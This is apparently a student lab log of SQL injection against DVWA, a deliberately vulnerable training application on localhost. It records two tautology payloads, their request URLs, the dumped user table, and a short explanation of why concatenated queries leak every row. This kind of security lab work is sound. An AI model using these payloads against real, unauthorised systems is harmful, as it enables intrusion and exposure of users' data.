SQL Injection Payload Log — Task 3

Target: DVWA (Damn Vulnerable Web Application), Security Level: Low
Module: SQL Injection
URL: http://localhost/dvwa/vulnerabilities/sqli/

Baseline — Normal Query (for comparison)

Input: 1

Output:
ID: 1
First name: admin
Surname: admin

A normal, legitimate query returns exactly one record — the user whose ID matches the number entered.

Payload 1: ' OR '1'='1

Full request URL:
http://localhost/dvwa/vulnerabilities/sqli/?id='+OR+'1'%3D'1&Submit=Submit#

Output:
ID: ' OR '1'='1
First name: admin        Surname: admin
First name: Gordon       Surname: Brown
First name: Hack         Surname: Me
First name: Pablo        Surname: Picasso
First name: Bob          Surname: Smith

Result: Instead of returning one user, the query returned all five users in the database.

Payload 2: %' or '0'='0

Full request URL:
http://localhost/dvwa/vulnerabilities/sqli/?id=%25'+or+'0'%3D'0&Submit=Submit#

Output:
ID: %' or '0'='0
First name: admin        Surname: admin
First name: Gordon       Surname: Brown
First name: Hack         Surname: Me
First name: Pablo        Surname: Picasso
First name: Bob          Surname: Smith

Result: Same outcome as Payload 1 — every user record was dumped, confirming the vulnerability is consistently exploitable with different payload syntax.

What's Happening — In Plain Terms

The application's underlying SQL query is built by directly inserting the user's input into a query string, roughly:
SELECT first_name, last_name FROM users WHERE user_id = '$id';

When a normal number like 1 is submitted, the query is well-formed and returns one row. But when the attacker submits ' OR '1'='1, the query becomes:
SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';

Because '1'='1' is always true, the WHERE clause matches every row in the table, regardless of the actual user_id values — so the database returns the entire users table instead of a single record.

What Data Was Exposed

The full list of registered users, including usernames (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) was exposed through a single form field — in a real application, this same flaw could expose usernames, email addresses, password hashes, or any other column in the queried table.
